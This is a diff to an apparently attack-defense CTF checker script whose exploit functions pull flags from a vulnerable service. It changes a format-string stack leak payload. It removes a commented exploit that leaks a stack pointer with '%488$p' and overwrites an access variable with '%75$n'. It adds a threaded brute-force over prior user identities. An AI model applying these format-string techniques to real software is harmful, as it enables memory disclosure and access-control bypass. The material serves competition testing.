@@ -2,12 +2,15 @@ import asyncio
 import random
 import re
 import string
+import threading
 import time
 from asyncio import StreamReader, StreamWriter
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timedelta
 from logging import LoggerAdapter
 from typing import Optional
 
+import exploit2
 import faker
 import generate_content
 from enochecker3 import (AsyncSocket, BaseCheckerTaskMessage, ChainDB,
@@ -384,7 +387,7 @@ async def exploit_treasure(task: ExploitCheckerTaskMessage, searcher: FlagSearch
     await conn.reader.readuntil(b": ")
 
     # Send the format string exploit as the password
-    conn.writer.write(b'%43$llx.%44$llx\n') # NOTE: Could differ on the vulnbox (because of x86?)
+    conn.writer.write(b'%33$llx.%34$llx\n') # NOTE: Could differ on the vulnbox (because of x86?)
     await conn.writer.drain()
 
     # Read the buffer to get the incorrect password message
@@ -511,10 +514,6 @@ async def getflag_private(
     await conn.writer.drain()
 
 
-# Relative positions on the stack from the stack dump for 2nd exploit (will be the same regardless of ASLR)
-reference_variable_pos = 0x1c38
-access_variable_pos = 0x003c
-
 @checker.exploit(1)
 async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
 
@@ -522,74 +521,49 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
         raise MumbleException("No attack info provided")
 
     private_dir, private_file = task.attack_info.split('/')
-    
-    await conn.reader.readuntil(b"$ ")
-    
-    # 1. Navigate to the directory
-    conn.writer.write(f'sail {private_dir}\n'.encode())
-    await conn.writer.drain()
     await conn.reader.readuntil(b"$ ")
 
-    # 2. Set identity and loot to get the address of the access variable
+    print("Task.address:", task.address)
 
-    # Note that the address space is randomized for each run of the program due to ASLR, but relative positions are the same
-    # The stack dump shows that the variable at %488$ stores the absolute address to a nearby position on the stack
-    # We call the pointed to location the reference variable, and note it is +0x1c38 from the stack pointer $sp
-    # We also see that the address storing the access variable is at +0x003c
-    # We can use this information to calculate the absolute address of the access variable
-    # To ensure the string is 64 bytes long, we can pad it with 'a's
-    # We also wrap the pointer in = to make it easier to extract from the response
-    conn.writer.write(f'identity\n'.encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b": ")
-    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=%488$p='
-    conn.writer.write(new_identity + b'\n')
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"$ ")
+    # Get current unix time in seconds
+    timestamp = int(time.time())
 
-    # Send command to loot file
-    conn.writer.write(f'loot {private_file}\n'.encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b": ")
-    conn.writer.write(b'\n')    # Send empty password, as we don't have the address yet
-    await conn.writer.drain()
-    response = await conn.reader.readuntil(b"$ ")
-    response = response.decode()
-    
-    # Get reference variable address
-    reference_variable_address = response.split('=')[1].strip()
+    # Testing on flags just created by the checker, so assume created in the two mins
+    timestamp -= 300
 
-    # Calculate the address of the access variable using relative positions in hex
-    reference_variable_address = int(reference_variable_address, 16)
-    access_variable_address = reference_variable_address - reference_variable_pos + access_variable_pos
+    # Read the current identity to use for the exploit
+    identity = await conn.get_identity()
 
-    # 3. Set identity and loot to write a truthy value to the access variable
+    # Get potential flag identities (try 150 last connections to be safe)
+    potential_flags = exploit2.get_previous_users(200, timestamp, 1000, identity)
 
-    # We will this time input the address of the access variable when prompted for a password during the loot command
-    # From the stack dump we can deduce that input at this prompt is stored at %75$
-    # Now that we know the address of the access variable will be stored at %75$ we can use %n
-    # %75$n will take the count of the characters in front of it and write this value to the address stored at %75$
-    # Voila! We have written a truthy value to the access variable
-    conn.writer.write(f'identity\n'.encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b": ")
-    new_identity = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%75$n'
-    conn.writer.write(new_identity + b'\n')
-    await conn.writer.drain()
-    await conn.reader.readuntil(b"$ ")
+    flag_found = threading.Event()
+    result_flag = None
 
-    # Send command to loot file
-    conn.writer.write(f'loot {private_file}\n'.encode())
-    await conn.writer.drain()
-    await conn.reader.readuntil(b": ")
-    # Send the raw byte representation of the access variable address
-    conn.writer.write(access_variable_address.to_bytes(8, 'little') + b'\n')
-    await conn.writer.drain()
+    def process_flag(potential_flag):
+        nonlocal result_flag
+        if flag_found.is_set():
+            return None  # Skip processing if flag is already found
 
-    # Check for the flag in the result
-    result = await conn.reader.readuntil(b"$ ")
-    if flag := searcher.search_flag(result):
-        return flag
+        response = exploit2.process_identity(potential_flag, private_dir, private_file, task.address, SERVICE_PORT)
+        # Check if the flag is in the response
+        if flag := searcher.search_flag(response):
+            result_flag = flag
+            flag_found.set()  # Indicate that the flag is found
+            return flag
+        return None
+
+    # Use ThreadPoolExecutor to parallelize the process_flag function
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(process_flag, potential_flag) for potential_flag in potential_flags]
+
+        for future in as_completed(futures):
+            result = future.result()
+            if result:
+                break  # Exit the loop once the flag is found
+
+    if result_flag:
+        return result_flag
 
     raise MumbleException("flag not found: exploit(1)")
 
